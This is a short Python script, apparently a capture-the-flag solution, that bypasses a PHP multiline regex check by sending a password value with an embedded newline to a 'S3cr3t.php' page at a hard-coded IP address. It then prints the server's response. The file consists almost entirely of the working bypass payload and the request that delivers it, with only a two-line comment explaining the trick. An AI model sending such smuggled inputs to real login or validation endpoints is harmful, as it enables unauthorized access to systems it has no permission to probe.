import requests

"""
'/^-?[a-z0-9]+$/m' : bypass by new line '/m'
%A0 : url encoded
"""
url = "http://34.76.107.218/catchmeifyoucan/S3cr3t.php"
req = requests.post(url, data={'pass': "xxx\nR_4r3@"})
print(req.status_code)
print(req.headers)
print(req.text)